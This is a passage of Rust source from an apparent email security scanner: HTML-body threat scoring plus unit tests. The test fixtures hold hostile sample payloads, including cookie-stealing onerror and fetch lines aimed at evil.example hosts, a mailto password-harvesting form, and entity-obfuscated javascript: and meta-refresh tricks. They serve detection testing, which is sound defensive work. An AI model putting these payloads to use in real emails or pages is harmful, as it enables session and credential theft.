            let count = entity_decoded_lower.matches(&pat_lower).count();
            if count > 0 {
                total_score += pat.severity * count as f64;
                categories.push(pat.category.to_string());

                let snippet = if let Some(idx) = html_lower.find(&pat_lower) {
                    let snip_start = idx.saturating_sub(20);
                    let snip_end = (idx + pat_lower.len() + 40).min(body_html.len());
                    Some(utf8_safe_slice(body_html, snip_start, snip_end))
                } else {
                    // Entity-form hit: the raw body has no literal occurrence,
                    // so take the snippet from the decoded view (UTF-8 safe).
                    entity_decoded_lower.find(&pat_lower).and_then(|idx| {
                        entity_decoded
                            .get(
                                idx.saturating_sub(20)
                                    ..(idx + pat_lower.len() + 40).min(entity_decoded.len()),
                            )
                            .map(str::to_string)
                    })
                };

                evidence.push(Evidence {
                    description: format!("{} (found {} occurrence(s))", pat.label, count),
                    location: Some("body_html".to_string()),
                    snippet,
                });
            }
        }

        let (trusted_iframe_count, suspicious_iframe_count, iframe_snippet) =
            inspect_iframes(body_html);
        if suspicious_iframe_count > 0 {
            total_score += 0.25 * suspicious_iframe_count as f64;
            categories.push("xss".to_string());
            evidence.push(Evidence {
                description: format!(
                    "Embedded frame <iframe> (found {} occurrence(s))",
                    suspicious_iframe_count
                ),
                location: Some("body_html".to_string()),
                snippet: iframe_snippet,
            });
        }

        let event_handler_findings = check_suspicious_event_handlers(&html_lower, body_html);
        if !event_handler_findings.is_empty() {
            total_score += (0.25 * event_handler_findings.len() as f64).min(0.50);
            categories.push("xss".to_string());
            evidence.extend(event_handler_findings);
        }

        // <script> content analysis: only flag scripts containing dangerous operations
        let (script_score, script_evidence) = analyze_scripts(&html_lower, body_html);
        if script_score > 0.0 {
            total_score += script_score;
            categories.push("xss".to_string());
            evidence.extend(script_evidence);
        }

        let onclick_findings = check_suspicious_onclick_handlers(&html_lower, body_html);
        if !onclick_findings.is_empty() {
            total_score += 0.15 * onclick_findings.len() as f64;
            categories.push("xss".to_string());
            for (handler, snippet) in onclick_findings {
                evidence.push(Evidence {
                    description: format!("Suspicious onclick handler: {}", handler),
                    location: Some("body_html".to_string()),
                    snippet,
                });
            }
        }

        // Check base64 data URIs. Scan the entity-decoded view as well:
        // d&#97;ta:text/html;base64,... hides the scheme from the raw scan.
        let (b64_findings, b64_from_decoded) = {
            let raw_findings = check_base64_data_uris(&html_lower);
            let decoded_findings = check_base64_data_uris(&entity_decoded_lower);
            if decoded_findings.len() > raw_findings.len() {
                (decoded_findings, true)
            } else {
                (raw_findings, false)
            }
        };
        if !b64_findings.is_empty() {
            total_score += 0.2 * b64_findings.len() as f64;
            categories.push("data_uri".to_string());
            for (desc, pos) in &b64_findings {
                let snip_start = pos.saturating_sub(10);
                let snippet = if b64_from_decoded {
                    entity_decoded
                        .get(snip_start..(*pos + 60).min(entity_decoded.len()))
                        .map(str::to_string)
                } else {
                    let snip_end = (*pos + 60).min(body_html.len());
                    Some(body_html[snip_start..snip_end].to_string())
                };
                evidence.push(Evidence {
                    description: format!("Base64 data URI: {}", desc),
                    location: Some("body_html".to_string()),
                    snippet,
                });
            }
        }

        // `mailto:` contact links and feedback forms are benign. A password
        // input submitted through that scheme is different: clicking submit
        // hands the entered credential to an attacker-selected mailbox while
        // bypassing the HTTP link-analysis layer entirely. Treat the compound
        // as one high-confidence HTML-deception cause (no per-input stacking).
        if let Some(policy) = mailto_credential_form_policy() {
            let credential_forms = credential_form_findings(&numeric_decoded);
            if !credential_forms.is_empty() {
                total_score += policy.score;
                categories.push(policy.result_category);
                evidence.extend(credential_forms);
            }
        }

        // CSS hidden text detection: display:none / visibility:hidden / font-size:0.
        // Responsive email templates routinely hide alternate images and layout
        // blocks in @media rules. Score hidden markup only when it is outside a
        // stylesheet and looks like a textual payload; CSS-only responsive
        // declarations are coverage telemetry, not a threat by themselves.
        {
            // Aho-Corasick scan over the CSS-hidden pattern list. Counts the
            // number of distinct seeded patterns observed (so the policy
            // below can distinguish "one accidental display:none" from
            // "many overlapping hide tricks").
            let html_without_style = without_style_blocks(&html_lower);
            let hidden_count = css_hidden_content_patterns()
                .scan(&html_without_style)
                .distinct_count();
            let class_hidden_count = count_css_hidden_class_markup(body_html);

            if hidden_count > 0 || class_hidden_count > 0 {
                let responsive_css = has_responsive_media_css(&html_lower);
                let suspicious_hidden_count =
                    count_suspicious_hidden_inline_markup(&html_without_style) + class_hidden_count;

                if responsive_css && suspicious_hidden_count == 0 {
                    // Typical responsive template: hidden CSS declarations and
                    // perhaps one hidden alternate <img>. Do not turn this
                    // layout mechanism into a low-risk finding.
                } else if suspicious_hidden_count >= 3 {
                    // Many hidden elements - highly suspicious
                    total_score += 0.30;
                    categories.push("css_hidden_content".to_string());
                    evidence.push(Evidence {
                        description: format!(
                            "Found {} CSS hidden content instances (display:none/visibility:hidden) — possibly used to evade analysis or hide malicious payloads",
                            suspicious_hidden_count
                        ),
                        location: Some("body_html:style".to_string()),
                        snippet: None,
                    });
                } else if suspicious_hidden_count >= 1 {
                    // Few hidden elements - possibly normal responsive design, low severity
                    total_score += 0.10;
                    categories.push("css_hidden_content".to_string());
                    evidence.push(Evidence {
                        description: format!(
                            "Found {} CSS hidden content instance(s) (possibly responsive design or hidden malicious content)",
                            suspicious_hidden_count
                        ),
                        location: Some("body_html:style".to_string()),
                        snippet: None,
                    });
                }
            }
        }

        let tiny_payloads = tiny_font_actionable_payloads(ctx, &html_lower);
        if !tiny_payloads.is_empty() {
            total_score += 0.56;
            categories.push("css_hidden_content".to_string());
            categories.push("hidden_external_action_lure".to_string());
            categories.push("phishing".to_string());
            evidence.push(Evidence {
                description: "A tiny, low-contrast HTML block combines an external untrusted URL with an account/security action and a stated consequence".to_string(),
                location: Some("body_html:hidden low-visibility text".to_string()),
                snippet: tiny_payloads.into_iter().next(),
            });
        }

        // Check overall HTML size for obfuscation indicator
        if body_html.len() > 200_000 {
            total_score += 0.1;
            evidence.push(Evidence {
                description: format!(
                    "Oversized HTML body ({} bytes), potentially contains obfuscated code",
                    body_html.len()
                ),
                location: Some("body_html".to_string()),
                snippet: None,
            });
        }

        // --- Bidirectional (BIDI / RTL-override) control character detection ---
        // Any presence of RLO/LRO/RLI/LRI/... in raw HTML body is highly
        // suspicious. These are virtually never emitted by legitimate MUAs and
        // are the signature of "Trojan Source" style spoofing — they can reverse
        // the rendered order of text so a link looks innocuous while actually
        // pointing elsewhere, or disguise malicious filenames.
        // Numeric character references (&#8238; / &#x202E;, semicolon optional)
        // are already decoded into `numeric_decoded` above: entity-encoded
        // control characters render identically but would otherwise escape
        // the raw character count entirely.
        let (bidi_total, bidi_distinct) = count_bidi_control_chars(&numeric_decoded);
        if bidi_total > 0 {
            // Severity scales: 1-2 chars might be benign i18n; 3+ or multiple
            // distinct types is almost certainly an attack.
            let bidi_score = if bidi_total >= 3 || bidi_distinct >= 2 {
                0.35
            } else {
                0.20
            };
            total_score += bidi_score;
            categories.push("bidi_override_attack".to_string());
            evidence.push(Evidence {
                description: format!(
                    "HTML contains {} Unicode bidirectional control character(s) ({} distinct) — common in RTL-override filename/URL spoofing (Trojan Source)",
                    bidi_total, bidi_distinct
                ),
                location: Some("body_html".to_string()),
                snippet: None,
            });
        }

        // --- Zero-width / invisible character detection ---
        // Large volumes of zero-width chars are used to cloak phishing keywords
        // from keyword-based filters. A small number can appear naturally in
        // rendered text (e.g. emoji ZWJ sequences), so we require a meaningful
        // density before flagging.
        let zw_count = count_zero_width_chars(&numeric_decoded);
        if zw_count >= 10 {
            let zw_score = if zw_count >= 30 { 0.25 } else { 0.12 };
            total_score += zw_score;
            categories.push("zero_width_cloaking".to_string());
            evidence.push(Evidence {
                description: format!(
                    "HTML contains {} zero-width / invisible Unicode character(s) — may be used to cloak phishing keywords from filters",
                    zw_count
                ),
                location: Some("body_html".to_string()),
                snippet: None,
            });
        }

        // --- Meta refresh redirect detection (attribute-order independent) ---
        // The old flat substring pattern `<meta http-equiv="refresh"` missed
        // reordered attributes (`content` before `http-equiv`) and unquoted
        // values. Count refresh tags via the tag-level matchers instead.
        // Tags are matched on the numeric-entity-decoded view so that
        // `<m&#101;ta http-equiv=...>` / `&#109;eta refresh` cannot hide the
        // tag (numeric decoding never expands &lt;/&gt;, so escaped example
        // code cannot manufacture phantom tags).
        let meta_refresh_tags: Vec<&str> = META_TAG_RE
            .find_iter(&numeric_decoded)
            .map(|m| m.as_str())
            .filter(|tag| META_HTTP_EQUIV_REFRESH_RE.is_match(tag))
            .collect();
        if !meta_refresh_tags.is_empty() {
            total_score += 0.20 * meta_refresh_tags.len() as f64;
            categories.push("redirect".to_string());
            evidence.push(Evidence {
                description: format!(
                    "Meta auto-refresh/redirect (found {} occurrence(s))",
                    meta_refresh_tags.len()
                ),
                location: Some("body_html".to_string()),
                snippet: Some(meta_refresh_tags[0].chars().take(120).collect()),
            });
        }

        // --- Meta refresh redirect URL analysis ---
        // <meta http-equiv="refresh" content="0;URL=..."> is used by phishing
        // landing pages to redirect instantly after page load. Beyond the
        // +0.20 charged per refresh tag above, we also delegate the *target*
        // URL to the full link analyser so that a redirect to a known
        // phishing-style URL is properly scored.
        let meta_refresh_urls = extract_meta_refresh_urls(&numeric_decoded);
        for redirect_url in meta_refresh_urls.iter().take(5) {
            let (refresh_score, refresh_reasons) = score_meta_refresh_url(redirect_url);
            if refresh_score > 0.0 {
                total_score += refresh_score;
                categories.extend(refresh_reasons.iter().cloned());
                evidence.push(Evidence {
                    description: format!(
                        "Meta refresh redirect target is suspicious: {} ({})",
                        redirect_url,
                        refresh_reasons.join(", ")
                    ),
                    location: Some("body_html:meta_refresh".to_string()),
                    snippet: Some(redirect_url.clone()),
                });
            }
        }

        // --- javascript: protocol in href/action/src ---
        // The generic "javascript:" substring pattern already charges 0.30, but
        // it fires on any occurrence (including escaped text in scripts). We
        // add a stronger signal when a navigation attribute actually uses the
        // pseudo-protocol, which is a hallmark of malicious payload delivery.
        // Matches run on the numeric-entity-decoded view so that
        // href="jav&#97;script:..." cannot evade the attribute matcher.
        let js_href_hits: Vec<_> = JS_HREF_RE.find_iter(&numeric_decoded).collect();
        if !js_href_hits.is_empty() {
            total_score += 0.15 * js_href_hits.len().min(3) as f64;
            categories.push("javascript_protocol_href".to_string());
            for m in js_href_hits.iter().take(3) {
                let snip_start = m.start().saturating_sub(10);
                let snip_end = (m.end() + 50).min(numeric_decoded.len());
                evidence.push(Evidence {
                    description: "Navigation attribute uses javascript: pseudo-protocol — code execution via link click".to_string(),
                    location: Some("body_html:href".to_string()),
                    snippet: numeric_decoded
                        .get(snip_start..snip_end)
                        .map(str::to_string),
                });
            }
        }

        total_score = total_score.min(1.0);
        categories.sort();
        categories.dedup();

        let duration_ms = start.elapsed().as_millis() as u64;
        let threat_level = ThreatLevel::from_score(total_score);

        if threat_level == ThreatLevel::Safe {
            let summary = if trusted_iframe_count > 0 {
                format!(
                    "No malicious content found in HTML body; ignored {} trusted QQ Mail template iframe(s)",
                    trusted_iframe_count
                )
            } else {
                "No malicious content found in HTML body".to_string()
            };
            return Ok(ModuleResult::safe_analyzed(
                &self.meta.id,
                &self.meta.name,
                self.meta.pillar,
                &summary,
                duration_ms,
            ));
        }

        Ok(ModuleResult {
            module_id: self.meta.id.clone(),
            module_name: self.meta.name.clone(),
            pillar: self.meta.pillar,
            threat_level,
            confidence: 0.80,
            categories,
            summary: format!(
                "HTML body scan found {} suspicious content item(s), composite score {:.2}",
                evidence.len(),
                total_score
            ),
            evidence,
            details: serde_json::json!({
                "score": total_score,
                "html_size": body_html.len(),
                "trusted_iframe_count": trusted_iframe_count,
                "suspicious_iframe_count": suspicious_iframe_count,
            }),
            duration_ms,
            analyzed_at: Utc::now(),
            bpa: None,
            engine_id: None,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use vigilyx_core::models::{EmailSession, Protocol};

    fn analyze_html(html: &str) -> ModuleResult {
        let mut session = EmailSession::new(
            Protocol::Smtp,
            "10.0.0.1".to_string(),
            12345,
            "10.0.0.2".to_string(),
            25,
        );
        session.content.body_html = Some(html.to_string());
        let ctx = SecurityContext::new(Arc::new(session));
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("test runtime")
            .block_on(HtmlScanModule::new().analyze(&ctx))
            .expect("HTML scan")
    }

    #[test]
    fn qq_mail_template_iframes_are_informational_only() {
        let result = analyze_html(
            r#"<html><body>
                <iframe src="https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html"
                    class="iframe_ad_container iframe_adv_ad_container" style="height:277px;"></iframe>
                <iframe src="https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html"
                    class="iframe_ad_container iframe_adv_ad_container" style="height:300px;"></iframe>
            </body></html>"#,
        );

        assert_eq!(result.threat_level, ThreatLevel::Safe);
        assert!(!result.categories.contains(&"xss".to_string()));
    }

    #[test]
    fn untrusted_iframes_remain_xss_evidence() {
        let result = analyze_html(
            r#"<iframe src="https://evil.example/login"></iframe><iframe src="data:text/plain,test"></iframe>"#,
        );

        assert!(result.threat_level >= ThreatLevel::Medium);
        assert!(result.categories.contains(&"xss".to_string()));
    }

    #[test]
    fn empty_iframe_without_payload_is_not_xss() {
        let html = r#"<html><body><iframe src="" onerror=""></iframe></body></html>"#;
        let result = analyze_html(html);
        assert!(!result.categories.contains(&"xss".to_string()));
    }

    #[test]
    fn qq_mail_iframe_exemption_rejects_spoofed_or_duplicate_src() {
        for html in [
            r#"<iframe data-src="https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html" src="https://evil.example/login" class="iframe_ad_container"></iframe>"#,
            r#"<iframe src="https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html" src="https://evil.example/login" class="iframe_ad_container"></iframe>"#,
        ] {
            let result = analyze_html(html);
            assert!(result.threat_level >= ThreatLevel::Low);
            assert!(result.categories.contains(&"xss".to_string()));
        }
    }

    #[test]
    fn benign_onclick_toggle_is_not_flagged() {
        let html =
            "<div onclick=\"document.getElementById('panel').style.display='block'\">open</div>";
        let findings = check_suspicious_onclick_handlers(&html.to_lowercase(), html);
        assert!(findings.is_empty());
    }

    #[test]
    fn redirecting_onclick_is_flagged() {
        let html = "<div onclick=\"window.location='https://evil.test/login'\">open</div>";
        let findings = check_suspicious_onclick_handlers(&html.to_lowercase(), html);
        assert_eq!(findings.len(), 1);
        assert!(findings[0].0.contains("window.location"));
    }

    #[test]
    fn empty_event_handler_is_not_flagged() {
        let html = r#"<img src="cid:logo" onerror="">"#;
        let findings = check_suspicious_event_handlers(&html.to_lowercase(), html);
        assert!(findings.is_empty());
    }

    #[test]
    fn executable_event_handler_is_flagged() {
        let html =
            r#"<img src="x" onerror="this.src='https://evil.test/pixel?c='+document.cookie">"#;
        let findings = check_suspicious_event_handlers(&html.to_lowercase(), html);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn detects_rlo_override_character() {
        // Classic RTL-override: visible order "file.exe" but actual bytes spell
        // "exe.elif" thanks to U+202E reversing the rendering.
        let html = "<p>Please open \u{202E}fdp.exe</p>";
        let (total, distinct) = count_bidi_control_chars(html);
        assert_eq!(total, 1);
        assert_eq!(distinct, 1);
    }

    #[test]
    fn detects_multiple_distinct_bidi_chars() {
        let html = "<p>\u{202E}bad\u{202C} and \u{2066}more\u{2069}</p>";
        let (total, distinct) = count_bidi_control_chars(html);
        assert_eq!(total, 4);
        assert_eq!(distinct, 4);
    }

    #[test]
    fn benign_html_has_no_bidi_chars() {
        let html = "<p>Hello, welcome to our service.</p>";
        let (total, distinct) = count_bidi_control_chars(html);
        assert_eq!(total, 0);
        assert_eq!(distinct, 0);
    }

    #[test]
    fn counts_zero_width_cloaking() {
        let mut html = String::from("<p>");
        for _ in 0..15 {
            html.push('p');
            html.push('\u{200B}'); // insert zero-width space between every char
        }
        html.push_str("</p>");
        assert!(count_zero_width_chars(&html) >= 15);
    }

    #[test]
    fn extracts_meta_refresh_target() {
        let html = r#"<html><head><meta http-equiv="refresh" content="0;URL=https://evil.example/login"></head></html>"#;
        let urls = extract_meta_refresh_urls(html);
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0], "https://evil.example/login");
    }

    #[test]
    fn extracts_meta_refresh_with_reversed_attribute_order() {
        // `content` before `http-equiv` evaded the fixed-order regex entirely.
        let html = r#"<meta content="0;URL=https://evil.example/login" http-equiv="refresh">"#;
        let urls = extract_meta_refresh_urls(html);
        assert_eq!(urls, vec!["https://evil.example/login".to_string()]);
    }

    #[test]
    fn extracts_meta_refresh_with_unquoted_values() {
        // Unquoted attribute values evaded the quoted-only content capture.
        let html = r#"<meta http-equiv=refresh content=0;URL=https://evil.example/x>"#;
        let urls = extract_meta_refresh_urls(html);
        assert_eq!(urls, vec!["https://evil.example/x".to_string()]);
    }

    #[test]
    fn meta_refresh_reversed_attributes_still_scores_redirect() {
        let result = analyze_html(
            r#"<html><head><meta content="0; URL=https://evil.example/login" http-equiv="refresh"></head></html>"#,
        );

        assert!(
            result.categories.contains(&"redirect".to_string()),
            "reordered meta refresh must still score the redirect category: {:?}",
            result.categories
        );
        assert!(
            result.evidence.iter().any(|e| e
                .description
                .contains("Meta refresh redirect target is suspicious")),
            "refresh target URL analysis must still run on the extracted URL: {:?}",
            result.evidence
        );
    }

    #[test]
    fn non_refresh_meta_tags_are_not_extracted() {
        let html = r#"<meta charset="utf-8"><meta name="viewport" content="width=device-width">"#;
        assert!(extract_meta_refresh_urls(html).is_empty());
        let result = analyze_html(html);
        assert!(!result.categories.contains(&"redirect".to_string()));
    }

    #[test]
    fn numeric_entity_encoded_bidi_chars_are_counted() {
        // &#8238; is U+202E (RLO). Spelled as an entity it renders identically
        // but previously escaped the raw character count entirely.
        let html = "<p>Please open &#8238;fdp.exe</p>";
        let (total, distinct) = count_bidi_control_chars(&decode_numeric_entities(html));
        assert_eq!(total, 1);
        assert_eq!(distinct, 1);

        let hex_html = "<p>&#x202E;payload&#x202C;</p>";
        let (hex_total, hex_distinct) =
            count_bidi_control_chars(&decode_numeric_entities(hex_html));
        assert_eq!(hex_total, 2);
        assert_eq!(hex_distinct, 2);
    }

    #[test]
    fn numeric_entity_encoded_bidi_triggers_module_category() {
        let result = analyze_html("<p>open &#8238; this file</p>");
        assert!(
            result
                .categories
                .contains(&"bidi_override_attack".to_string()),
            "entity-encoded RLO must count toward the BIDI signal: {:?}",
            result.categories
        );
    }

    #[test]
    fn numeric_entity_encoded_zero_width_chars_trigger_cloaking() {
        // 30 x &#8203; (ZERO WIDTH SPACE): entity-encoded zero-width padding
        // previously counted as zero characters. 30+ chars scores 0.25, which
        // crosses the Safe threshold so the category survives in the result.
        let mut html = String::from("<p>");
        for _ in 0..30 {
            html.push_str("&#8203;");
        }
        html.push_str("</p>");

        let result = analyze_html(&html);
        assert!(
            result
                .categories
                .contains(&"zero_width_cloaking".to_string()),
            "entity-encoded zero-width characters must count toward cloaking: {:?}",
            result.categories
        );
    }

    #[test]
    fn malformed_numeric_entities_are_left_untouched() {
        // Out-of-range code points and non-numeric payloads must not be
        // decoded into replacement garbage.
        let html = "<p>&#99999999;&#xD800;&#xZZ; &amp; stays</p>";
        let decoded = decode_numeric_entities(html);
        assert!(decoded.contains("&#99999999;"));
        assert!(decoded.contains("&#xD800;"));
        assert!(decoded.contains("&#xZZ;"));
        assert!(decoded.contains("&amp;"));
    }

    #[test]
    fn extracts_meta_refresh_with_spaces_and_lowercase() {
        let html =
            r#"<meta http-equiv='refresh' content=' 5 ; url = https://slow.example/step2 '>"#;
        let urls = extract_meta_refresh_urls(html);
        assert_eq!(urls.len(), 1);
        assert_eq!(urls[0].trim(), "https://slow.example/step2");
    }

    #[test]
    fn scores_meta_refresh_dangerous_scheme() {
        let (score, reasons) = score_meta_refresh_url("javascript:alert(1)");
        assert!(score >= 0.45);
        assert!(reasons.iter().any(|r| r == "meta_refresh_dangerous_scheme"));
    }

    #[test]
    fn scores_meta_refresh_auth_param() {
        // analyze_url may or may not fire on this arbitrary host; we're
        // verifying the auth-param signal specifically.
        let (score, reasons) = score_meta_refresh_url("https://x.example/continue?token=abc123");
        assert!(score >= 0.10);
        assert!(reasons.iter().any(|r| r == "meta_refresh_auth_param"));
    }

    #[test]
    fn detects_javascript_href() {
        let html = r#"<a href="javascript:alert(1)">Click</a>"#;
        assert!(JS_HREF_RE.is_match(html));
    }

    #[test]
    fn detects_javascript_formaction() {
        let html = r#"<button formaction='javascript:doThing()'>Go</button>"#;
        assert!(JS_HREF_RE.is_match(html));
    }

    #[test]
    fn non_javascript_href_not_matched() {
        let html = r#"<a href="https://example.com/path">Go</a>"#;
        assert!(!JS_HREF_RE.is_match(html));
    }

    #[test]
    fn mailto_password_form_is_credential_exfiltration() {
        let result = analyze_html(
            r#"<form action='mailto:conf1rm@evil.example?subject=verify' method='post'>
                账号 <input name='account'>
                密码 <input type='password' name='password'>
                <button>提交确认</button>
            </form>"#,
        );

        assert!(
            result
                .categories
                .contains(&"credential_exfiltration_form".to_string()),
            "password + mailto form must be actionable: {result:?}"
        );
        assert!(result.threat_level >= ThreatLevel::High, "{result:?}");
    }

    #[test]
    fn entity_and_whitespace_obfuscated_mailto_password_form_is_detected() {
        let result = analyze_html(
            r#"<FORM ACTION='ma&Tab;il&#116;o:collect@evil.example'>
                <INPUT TYPE='PASSWORD' name='secret'>
            </FORM>"#,
        );

        assert!(
            result
                .categories
                .contains(&"credential_exfiltration_form".to_string()),
            "browser-decoded mailto scheme must not bypass the compound: {result:?}"
        );
    }

    #[test]
    fn untrusted_https_password_form_is_credential_exfiltration() {
        let result = analyze_html(
            r#"<form action='https://learn-portal.example.co/session'>
                工号 <input name='uid'>
                域密码 <input type='password' name='pwd'>
            </form>"#,
        );

        assert!(
            result
                .categories
                .contains(&"credential_exfiltration_form".to_string()),
            "password + untrusted HTTPS action must be actionable: {result:?}"
        );
    }

    #[test]
    fn official_sso_password_form_is_not_exfiltration() {
        let result = analyze_html(
            r#"<form action='https://login.microsoftonline.com/common/oauth2/v2.0/authorize'>
                <input type='password' name='pwd'>
            </form>"#,
        );

        assert!(
            !result
                .categories
                .contains(&"credential_exfiltration_form".to_string()),
            "official SSO target must not be treated as an attacker mailbox: {result:?}"
        );
    }

    #[test]
    fn ordinary_mailto_contact_surfaces_stay_safe() {
        for html in [
            r#"<a href='mailto:support@example.com'>联系我们</a>"#,
            r#"<form action='mailto:feedback@example.com'><input name='comment'><button>反馈</button></form>"#,
            r#"&lt;form action='mailto:demo@example.com'&gt;&lt;input type='password'&gt;&lt;/form&gt;"#,
        ] {
            let result = analyze_html(html);
            assert!(
                !result
                    .categories
                    .contains(&"credential_exfiltration_form".to_string()),
                "mailto without a real password form is not credential exfiltration: {result:?}"
            );
        }
    }

    #[test]
    fn responsive_css_hidden_images_are_not_textual_payloads() {
        let html = r#"
            <style>@media (max-width: 736px) {
                .large-artwork { display: none !important; }
                .small-artwork { display: inline !important; }
            }</style>
            <img class="small-artwork" style="display:none" alt="alternate logo">
        "#;
        let lower = html.to_lowercase();
        let without_style = without_style_blocks(&lower);
        assert!(has_responsive_media_css(&lower));
        assert_eq!(count_suspicious_hidden_inline_markup(&without_style), 0);
    }

    #[test]
    fn qq_mail_hidden_download_annotation_is_not_a_hidden_payload() {
        let html = r#"<hr style="display:none;"><span style="display:none">：https://wx.mail.qq.com/ftn/download?func=3&amp;key=opaque-download-token&amp;code=opaque-code</span>"#;
        let lower = html.to_lowercase();
        let without_style = without_style_blocks(&lower);

        assert_eq!(count_suspicious_hidden_inline_markup(&without_style), 0);
    }

    #[test]
    fn hidden_block_with_inline_text_remains_a_signal() {
        let html = r#"<div style="display:none">verify your account password</div>"#;
        assert_eq!(count_suspicious_hidden_inline_markup(html), 1);
    }

    #[test]
    fn ordinary_report_font_sizes_are_not_hidden_css_values() {
        let html = r#"<div style="font-size:18px">报告下载</div>
            <span style="font-size:14px">您的企业信用报告已经生成，请下载浏览。</span>
            <div style="font-size:13px">本数据仅供参考。</div>
            <span style="font-size:12pt">Generated successfully.</span>
            <span style="font-size:100px">Report</span>
            <td style="overflow:hidden;font-size:0;line-height:0">
                <img src="https://tracking.example.test/open.gif" width="1" height="1">
            </td>"#;

        assert_eq!(count_suspicious_hidden_inline_markup(html), 0);
        let result = analyze_html(html);
        assert_eq!(result.threat_level, ThreatLevel::Safe);
        assert!(
            !result
                .categories
                .contains(&"css_hidden_content".to_string())
        );
    }

    #[test]
    fn complete_hidden_css_values_remain_hidden_text_signals() {
        for style in [
            "font-size:0",
            "font-size:0px;",
            "font-size:0pt !important;",
            "font-size:1px",
            "font-size:1pt !important",
            "display:none!important",
            "visibility:hidden;",
        ] {
            let html = format!("<span style=\"{style}\">verify your account password</span>");
            assert_eq!(count_suspicious_hidden_inline_markup(&html), 1, "{style}");
            // A single hidden block scores below Low and is returned through
            // safe_analyzed, which intentionally drops the categories.
            assert!(
                analyze_html(&html.repeat(3))
                    .categories
                    .contains(&"css_hidden_content".to_string())
            );
        }
    }

    #[test]
    fn ordinary_statement_timer_script_is_not_xss() {
        let result = analyze_html(
            r#"<html><body><span id="clock"></span><script>
               function refreshClock() {
                 document.getElementById('clock').innerHTML = '账单生成中';
               }
               setInterval(refreshClock, 1000);
               </script></body></html>"#,
        );

        assert!(
            !result.categories.contains(&"xss".to_string()),
            "functions, timers and text updates alone are normal template behavior: {:?}",
            result.categories
        );
    }

    #[test]
    fn inline_script_with_network_exfiltration_remains_xss() {
        let result = analyze_html(
            r#"<script>fetch('https://evil.example/collect?c=' + document.cookie)</script>"#,
        );

        assert!(result.categories.contains(&"xss".to_string()));
        assert!(result.threat_level >= ThreatLevel::Low);
    }

    #[test]
    fn entity_encoded_javascript_protocol_is_detected() {
        // PoC: jav&#97;script: renders as javascript: in the MUA, but the raw
        // HTML never contains the literal token — before the fix both the flat
        // "javascript:" pattern and the href-attribute matcher went blind.
        let result =
            analyze_html(r#"<a href="jav&#97;script:alert(document.cookie)">点这里查看</a>"#);

        assert!(
            result.threat_level >= ThreatLevel::Low,
            "entity-encoded javascript: must score: {:?}",
            result
        );
        assert!(
            result.categories.contains(&"xss".to_string()),
            "flat pattern must fire on the decoded view: {:?}",
            result.categories
        );
        assert!(
            result
                .categories
                .contains(&"javascript_protocol_href".to_string()),
            "href attribute matcher must fire on the decoded view: {:?}",
            result.categories
        );
    }

    #[test]
    fn entity_encoded_meta_refresh_is_detected() {
        // PoC: <m&#101;ta http-equiv="refresh" ...> renders as a real meta
        // refresh tag, but META_TAG_RE never matched the raw entity form.
        let result = analyze_html(
            r#"<html><head><m&#101;ta http-equiv="refresh" content="0;URL=https://evil.example/login"></head></html>"#,
        );

        assert!(
            result.categories.contains(&"redirect".to_string()),
            "entity-encoded meta refresh tag must score the redirect category: {:?}",
            result.categories
        );
        assert!(
            result.evidence.iter().any(|e| e
                .description
                .contains("Meta refresh redirect target is suspicious")),
            "refresh target URL analysis must run on the decoded tag: {:?}",
            result.evidence
        );
    }

    #[test]
    fn no_semicolon_entity_bidi_char_is_counted() {
        // PoC: browsers decode `&#8238` even without the semicolon; the old
        // regex required ';' so the no-semicolon RLO escaped the count.
        let html = "<p>open &#8238 fdp.exe now</p>";
        let (total, distinct) = count_bidi_control_chars(&decode_numeric_entities(html));
        assert_eq!(total, 1);
        assert_eq!(distinct, 1);

        let result = analyze_html("<p>open &#8238 fdp.exe and also &#x202C here</p>");
        assert!(
            result
                .categories
                .contains(&"bidi_override_attack".to_string()),
            "no-semicolon entity BIDI chars must trigger the category: {:?}",
            result.categories
        );
    }

    #[test]
    fn escaped_example_markup_does_not_manufacture_tags() {
        // Regression guard: `&lt;meta http-equiv="refresh"...&gt;` is literal
        // text in the browser, not a refresh tag — the tag matchers run on the
        // numeric-only decoded view precisely so &lt;/&gt; never becomes markup.
        let result = analyze_html(
            r#"<p>Example: &lt;meta http-equiv="refresh" content="0;URL=https://evil.example/login"&gt;</p>"#,
        );
        assert!(
            !result.categories.contains(&"redirect".to_string()),
            "escaped meta example must not be treated as a real refresh tag: {:?}",
            result.categories
        );
    }
}
